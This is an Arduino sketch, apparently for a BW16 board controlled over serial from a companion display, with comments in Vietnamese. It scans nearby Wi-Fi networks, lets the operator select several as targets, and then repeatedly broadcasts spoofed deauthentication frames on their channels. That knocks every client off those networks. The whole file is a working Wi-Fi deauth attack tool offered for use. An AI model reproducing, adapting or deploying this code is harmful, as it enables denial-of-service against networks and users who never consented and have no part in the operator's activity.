#include <WiFi.h>
#include "wifi_cust_tx.h" 
#include "wifi_conf.h"
#include "wifi_util.h"
//use core 3.1.5 if it not working
// --- CẤU HÌNH ---
#define MAX_NETWORKS 50       
#define MAX_TARGETS 10 

// --- LED PINS ---
#define PIN_LED_R 12  
#define PIN_LED_G 10  
#define PIN_LED_B 11  

// --- ENUMS ---
enum LedState { LED_OFF, LED_BLUE_SOLID, LED_GREEN_WAIT, LED_RED_BLINK };
enum AttackType { ATK_NONE, ATK_DEAUTH, ATK_BEACON };

LedState currentLedState = LED_OFF;
AttackType currentAttack = ATK_NONE;
unsigned long ledTimer = 0;       
unsigned long scanDoneTime = 0;   
unsigned long packetTimer = 0; 
unsigned long scanHeartbeatTimer = 0;

struct NetworkInfo {
  char ssid[33];
  uint8_t bssid[6];     
  int channel;
  int rssi;
  int security; 
};

NetworkInfo scanResults[MAX_NETWORKS]; 
int scanCount = 0;                     

int selectedTargets[MAX_TARGETS]; 
int selectedCount = 0;

volatile bool isScanning = false;
volatile bool scanDoneTrigger = false; 
String serialBuffer = "";

// --- LED CONTROL ---
void setLedColor(bool r, bool g, bool b) {
  digitalWrite(PIN_LED_R, r ? HIGH : LOW);
  digitalWrite(PIN_LED_G, g ? HIGH : LOW);
  digitalWrite(PIN_LED_B, b ? HIGH : LOW);
}

void handleLedEffects() {
  unsigned long currentMillis = millis();
  switch (currentLedState) {
    case LED_OFF: setLedColor(0, 0, 0); break;
    case LED_BLUE_SOLID: setLedColor(0, 0, 1); break;
    case LED_GREEN_WAIT: 
      setLedColor(0, 1, 0); 
      if (currentMillis - scanDoneTime > 3000) currentLedState = LED_OFF;
      break;
    case LED_RED_BLINK:
      if ((currentMillis - ledTimer) > 100) {
        ledTimer = currentMillis;
        static bool toggle = false;
        toggle = !toggle;
        setLedColor(toggle, 0, 0); 
      }
      break;
  }
}

// --- SCAN HANDLER ---
rtw_result_t scanResultHandler(rtw_scan_handler_result_t *scan_result) {
  if (scan_result->scan_complete != RTW_TRUE) {
    if (scanCount >= MAX_NETWORKS) return RTW_SUCCESS;
    rtw_scan_result_t *record = &scan_result->ap_details;
    record->SSID.val[record->SSID.len] = 0; 

    NetworkInfo net;
    strncpy(net.ssid, (const char*)record->SSID.val, 32);
    net.ssid[32] = '\0'; 
    net.channel = record->channel;
    net.rssi = record->signal_strength;
    net.security = record->security;
    memcpy(net.bssid, record->BSSID.octet, 6);

    bool exists = false;
    for(int i=0; i<scanCount; i++) {
        if(memcmp(scanResults[i].bssid, net.bssid, 6) == 0) { exists = true; break; }
    }
    if(!exists) {
        scanResults[scanCount] = net;
        scanCount++;
    }
  } else {
    isScanning = false;
    scanDoneTrigger = true; 
  }
  return RTW_SUCCESS;
}

String getEncString(int sec) {
    if (sec == RTW_SECURITY_OPEN) return "OPEN";
    if (sec & RTW_SECURITY_WEP_PSK) return "WEP";
    if (sec & RTW_SECURITY_WPA2_AES_PSK) return "WPA2";
    if (sec & RTW_SECURITY_WPA_AES_PSK) return "WPA";
    return "UNK";
}

// --- DUAL UART (Serial1: PB1 TX, PB2 RX | Serial: PA7 TX, PA8 RX) ---
class DualSerial : public Print {
public:
  size_t write(uint8_t c) override {
    Serial1.write(c);
    return Serial.write(c);
  }
  size_t write(const uint8_t *buffer, size_t size) override {
    Serial1.write(buffer, size);
    return Serial.write(buffer, size);
  }
};
DualSerial DualUart;

void startScan() {
    currentAttack = ATK_NONE; 
    currentLedState = LED_OFF;
    scanCount = 0; 
    selectedCount = 0; 
    isScanning = true; 
    scanDoneTrigger = false;
    scanHeartbeatTimer = millis();
    wifi_scan_networks(scanResultHandler, NULL);
    DualUart.println("[SCAN STARTED...]");
}

void setup() {
  Serial.begin(115200);   // PA7 / PA8 (Log UART / Nạp / Debug)
  Serial1.begin(115200);  // PB1 / PB2 (Hardware Serial1 kết nối CYD)
  pinMode(PIN_LED_R, OUTPUT); pinMode(PIN_LED_G, OUTPUT); pinMode(PIN_LED_B, OUTPUT);
  setLedColor(0,0,0);
  
  wifi_on(RTW_MODE_STA); 
  DualUart.println("\n[BW16 MULTI-TARGET READY]");

  // [THAY ĐỔI QUAN TRỌNG] Tự động quét ngay khi khởi động
  delay(500); // Chờ wifi ổn định một chút
  startScan(); 
}

// --- ATTACK LOGIC ---
void atkDeauth() {
    static int currentTargetIdx = 0;
    
    if (selectedCount == 0) return;
    if (currentTargetIdx >= selectedCount) currentTargetIdx = 0;
    
    int targetID = selectedTargets[currentTargetIdx];
    
    if (targetID < 0 || targetID >= scanCount) {
        currentTargetIdx++;
        return;
    }
    
    NetworkInfo target = scanResults[targetID];
    
    wext_set_channel("wlan0", target.channel);
    delay(2);
    wifi_tx_deauth_frame(target.bssid, (void *)"\xFF\xFF\xFF\xFF\xFF\xFF", 2); 
    delay(2);
    wifi_tx_deauth_frame(target.bssid, (void *)"\xFF\xFF\xFF\xFF\xFF\xFF", 7); 
    
    currentTargetIdx++;
}

void handleAttack() {
    if (millis() - packetTimer < 15) return; 
    packetTimer = millis();
    if (currentAttack == ATK_DEAUTH) atkDeauth();
}

void printScanResults() {
    DualUart.println("--- SCAN RESULTS ---");
    for(int i=0; i<scanCount; i++) {
        DualUart.print("["); DualUart.print(i+1); DualUart.print("]\t");
        DualUart.print(scanResults[i].channel); DualUart.print("\t");
        DualUart.print(scanResults[i].rssi); DualUart.print("\t");
        DualUart.print(getEncString(scanResults[i].security)); DualUart.print("\t");
        DualUart.print(scanResults[i].ssid);
        DualUart.println();
    }
    DualUart.println("--------------------");
}

// --- COMMAND PARSER ---
void processCommand(String cmd) {
  cmd.trim();
  
  if (cmd == "sc") {
    // Gọi hàm quét đã tách ra
    startScan();
  }
  
  else if (cmd.startsWith("sl:")) {
    currentAttack = ATK_NONE;
    selectedCount = 0; 
    
    String nums = cmd.substring(3);
    char *token = strtok((char*)nums.c_str(), ",");
    while (token != NULL && selectedCount < MAX_TARGETS) {
        int id = atoi(token);
        if (id > 0 && id <= scanCount) {
            selectedTargets[selectedCount] = id - 1; 
            selectedCount++;
        }
        token = strtok(NULL, ",");
    }
    
    if (selectedCount > 0) {
        currentLedState = LED_BLUE_SOLID;
        DualUart.print("[SELECTED "); DualUart.print(selectedCount); DualUart.println(" TARGETS]");
    }
  }
  
  else if (cmd.startsWith("atk:") || cmd == "at" || cmd == "atk") {
      String type = cmd.startsWith("atk:") ? cmd.substring(4) : "deauth";
      if (type == "deauth" && selectedCount > 0) { 
          currentAttack = ATK_DEAUTH; 
          currentLedState = LED_RED_BLINK; 
          DualUart.println("[ATTACK STARTED]");
      } 
  }
  
  else if (cmd == "stop" || cmd == "st") {
    currentAttack = ATK_NONE;
    currentLedState = LED_OFF; 
    DualUart.println("[STOPPED]");
  }
}

void loop() {
  // Đọc lệnh từ Serial1 (PB1 TX, PB2 RX kết nối CYD)
  while (Serial1.available()) {
    char c = (char)Serial1.read();
    if (c == '\n') { processCommand(serialBuffer); serialBuffer = ""; } 
    else if (c != '\r') { serialBuffer += c; }
  }

  // Đọc lệnh từ Serial (PA7 TX, PA8 RX nạp/debug)
  while (Serial.available()) {
    char c = (char)Serial.read();
    if (c == '\n') { processCommand(serialBuffer); serialBuffer = ""; } 
    else if (c != '\r') { serialBuffer += c; }
  }

  // Hiển thị heartbeat khi đang scan
  if (isScanning && (millis() - scanHeartbeatTimer > 1000)) {
     scanHeartbeatTimer = millis(); DualUart.print("."); 
  }

  if (scanDoneTrigger) {
      scanDoneTrigger = false; 
      DualUart.println(""); // Xuống dòng sau các dấu chấm
      printScanResults();
      currentLedState = LED_GREEN_WAIT; scanDoneTime = millis();
  }

  if (currentAttack != ATK_NONE) handleAttack();
  handleLedEffects();
}